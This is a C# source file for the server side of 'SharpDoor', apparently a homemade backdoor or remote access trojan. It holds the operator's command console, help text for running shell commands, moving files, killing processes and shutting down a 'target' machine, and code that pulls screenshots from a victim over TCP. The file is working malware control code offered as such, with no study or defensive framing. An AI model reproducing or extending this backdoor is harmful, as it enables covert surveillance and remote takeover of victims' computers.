using Microsoft.VisualBasic;
using System;
using System.Collections.Generic;
using System.Globalization;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.Security.Cryptography;

namespace SharpDoor_Server//SERVER SIDE CONSOLE APP
{
    class SupportFuncLib    //Support Function Library for the SERVER
    {
        
        public static void ProgressBar(bool end, bool start)
        {
            if (start == true)
            {
                Console.Write("[-");
            }
            if (end == true)
            {
                Console.Write("-]  %100\n\n");
            }
            else if (end == false)
            {
                Console.Write("-");
            }
            return;
        }
        public static int GetScreenshot(NetworkStream stream, TcpClient client, string filename)
        {
            string path = Directory.GetCurrentDirectory() + "\\" + filename;
            int bytesRead = 0; int buffer = 4096;
            string fS = Program.Receive(stream, client);        //Steal his filesize
            Console.WriteLine("");
            int fileSize = int.Parse(fS);   //Parse it to a int
            byte[] bytesToRead = new byte[fileSize];    //Create a byteArray of the size of the file
            ProgressBar(false, true);
            while (bytesRead < bytesToRead.Length)  //While download is going on do this stuff
            {
                ProgressBar(false,false);
                if ((bytesRead + buffer) > bytesToRead.Length)      //Adjust buffer in case buffer is larger than buffer going over the wire
                {
                    buffer = bytesToRead.Length - bytesRead;
                    ProgressBar(true,false);
                }
                stream.Read(bytesToRead, bytesRead, buffer);    //Read bytes from stream
                //Console.WriteLine("Read " + buffer + " bytes from target");
                bytesRead += buffer;
            }
            File.WriteAllBytes(path, bytesToRead);  //Write image bytes to file
            Program.Send(stream, "0");  //Send confirmation to client
            Console.WriteLine("Succesfully downloaded screenshot "+filename+" to server");
            return 1;
        }
        public static int ChangeDirectory(string path)      //Changes the current server working directory for the one specified in path
        {
            try         //Try to change to path and return 0 if succesful
            {
                Directory.SetCurrentDirectory(path);
                return 0;
            }
            catch (DirectoryNotFoundException)          //If it couldnt change return 1
            {
                return 1;
            }
        }

        public static string GetIPV4()      //Gets the External Ip address of the server
        {
            string externalip = new WebClient().DownloadString("http://icanhazip.com");
            return externalip;
        }
        public static List<int> GetPorts() //Gather supported port list for the server
        {
            int PORT1 = 88;
            int PORT2 = 22;
            int PORT3 = 360;
            int PORT4 = 8000;
            int PORT5 = 8080;
            List<int> PORTS = new List<int>();
            PORTS.Add(PORT1);
            PORTS.Add(PORT2);
            PORTS.Add(PORT3);
            PORTS.Add(PORT4);
            PORTS.Add(PORT5);
            return PORTS;
        }

        public static void ListPorts()   //Takes the port list and prints all available ports to use
        {
            List<int> ports = GetPorts();
            int pLength = ports.Count;
            int x = 0;
            while (x < pLength)
            {
                Console.WriteLine("TCP: " + ports[x]);
                x += 1;
            }
            return;
        }

        public static void Connection_log(string client, int port)      //Connection log function
        {
            DateTime now = DateTime.Now;
            string path = Directory.GetCurrentDirectory() + "\\connection_log.txt";
            string write_to_file = ("Connected to Client: " + client + ":" + port + " at time: " + now + Environment.NewLine);
            File.WriteAllText(path, write_to_file);
            return;
        }

        public static void BootGreeting(string host, int port, string version)      //Boot greeting function
        {
            Console.ForegroundColor = ConsoleColor.Blue;
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine("");
            Console.WriteLine(" /$$$$$$ /$$                    /$$      /$$                 /$$      /$$                           /$$                     /$$     ");
            Console.WriteLine("|_  $$_/| $$                   | $$$    /$$$                | $$$    /$$$                          | $$                    | $/  ");
            Console.WriteLine("  | $$ /$$$$$$   /$$$$$$$      | $$$$  /$$$$  /$$$$$$       | $$$$  /$$$$  /$$$$$$  /$$$$$$$   /$$$$$$$  /$$$$$$  /$$   /$$|_/$$$$$$$");
            Console.WriteLine("  | $$|_  $$_/  /$$_____/      | $$ $$/$$ $$ /$$__  $$      | $$ $$/$$ $$ /$$__  $$| $$__  $$ /$$__  $$ |____  $$| $$  | $$ /$$_____/");
            Console.WriteLine("  | $$  | $$   |  $$$$$$       | $$  $$$| $$| $$  \\__/      | $$  $$$| $$| $$  \\ $$| $$  \\ $$| $$  | $$  /$$$$$$$| $$  | $$|  $$$$$$");
            Console.WriteLine("  | $$  | $$ /$$\\____  $$      | $$\\  $ | $$| $$            | $$\\  $ | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$| $$  | $$ \\____  $$");
            Console.WriteLine(" /$$$$$$|  $$$$//$$$$$$$/      | $$ \\/  | $$| $$            | $$ \\/  | $$|  $$$$$$/| $$  | $$|  $$$$$$$|  $$$$$$$|  $$$$$$$ /$$$$$$$/");
            Console.WriteLine("|______/ \\___/ |_______/       |__/     |__/|__/            |__/     |__/ \\______/ |__/  |__/ \\_______/ \\_______/ \\____  $$|_______/");
            Console.WriteLine("                       /$$$$$$  /$$                                    /$$$$$$$                                   /$$  | $$ ");
            Console.WriteLine("                      /$$__  $$| $$                                   | $$__  $$                                 |  $$$$$$/");
            Console.WriteLine("                     | $$  \\__/| $$$$$$$   /$$$$$$   /$$$$$$  /$$$$$$ | $$  \\ $$  /$$$$$$   /$$$$$$   /$$$$$$     \\______/ ");
            Console.WriteLine("                     |  $$$$$$ | $$__  $$ |____  $$ /$$__  $$/$$__  $$| $$  | $$ /$$__  $$ /$$__  $$ /$$__  $$ ");
            Console.WriteLine("                      \\____  $$| $$  \\ $$  /$$$$$$$| $$  \\__/ $$  \\ $$| $$  | $$| $$  \\ $$| $$  \\ $$| $$  \\__/");
            Console.WriteLine("                      /$$  \\ $$| $$  | $$ /$$__  $$| $$     | $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$ ");
            Console.WriteLine("                     |  $$$$$$/| $$  | $$|  $$$$$$$| $$     | $$$$$$$/| $$$$$$$/|  $$$$$$/|  $$$$$$/| $$ ");
            Console.WriteLine("                      \\______/ |__/  |__/ \\_______/|__/     | $$____/ |_______/  \\______/  \\______/ |__/ ");
            Console.WriteLine("                                                            | $$  ");
            Console.WriteLine("                                                            | $$ ");
            Console.WriteLine("                                                            |__/");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("\n\n\nBooting SharpDoor " + version + " Server on IP: " + host + " on PORT: " + port+"\n");

        }
        public static void Help()   //Command help function
        {
            Console.WriteLine("\n\n* starts mean unavailable at the moment *");
            Console.WriteLine("*- sysinfo - returns targets operating system and version number");
            Console.WriteLine("- cd 'PATH' - changes the target working directory to the one specified in PATH");
            Console.WriteLine("- ls - returns all files in the current target working directory");
            Console.WriteLine("- del 'filename' - deletes 'filename' from the current working directory");
            Console.WriteLine("- upld 'filename' - uploads 'filename' from the server to the target");
            Console.WriteLine("- dl 'filename' - downloads 'filename' from the target");
            Console.WriteLine("- task -ls - returns a list of all running process on the target system");
            Console.WriteLine("- task -kill 'PROCESS ID' - kills a running process on the target system");
            Console.WriteLine("- task -killall 'PROCESS NAME' - kills all processes with 'PROCESS NAME' running on the target");
            Console.WriteLine("- shell 'shell command' - attempts to run 'shell command' on the target system **PRIV ESC MAY BE REQUIRED**");
            Console.WriteLine("- server -ls - lists all files in current server working directory");
            Console.WriteLine("- server -cd 'PATH' - changes server working directory to 'PATH'");
            Console.WriteLine("- server -port -ls - lists all ports available for SharpDoor");
            Console.WriteLine("- server -port -change:'SUPPORTED PORT' - changes the server port to a supported SharpDoor port");
            Console.WriteLine("- client -screenshot - takes a screenshot of the clients screen and sends it to the server");
            Console.WriteLine("*- client -exit - disconnects current target");
            Console.WriteLine("*- client -shutdown - shutsdown target system");
            Console.WriteLine("*- client -restart - restarts targets system");
            Console.WriteLine("- exit - shutsdown the server and client\n\n");
            return;
        }

        public static void Shutdown(NetworkStream stream, TcpClient client, TcpListener listener)   //Shutdown function
        {
            int x = 0;
            while (x < 10)
            {
                Console.WriteLine("Shuting down server .");
                Console.WriteLine("Shuting down server ..");
                Console.WriteLine("Shuting down server ...");
                x += 1;

            }
            stream.Close();
            client.Close();
            listener.Stop();
            Environment.Exit(0);    //Terminate the process with return code 0
        }
        public static string ShellInjection(string command)     //Execute a shell command on server and print output
        {
            ProcessStartInfo psi = new ProcessStartInfo("cmd");
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
            psi.RedirectStandardInput = true;
            psi.CreateNoWindow = true;
            var proc = Process.Start(psi);

            proc.StandardInput.WriteLine(@command);
            proc.StandardInput.Flush();
            proc.StandardInput.Close();
            string s = proc.StandardOutput.ReadToEnd();
            return s;

        }

    }
}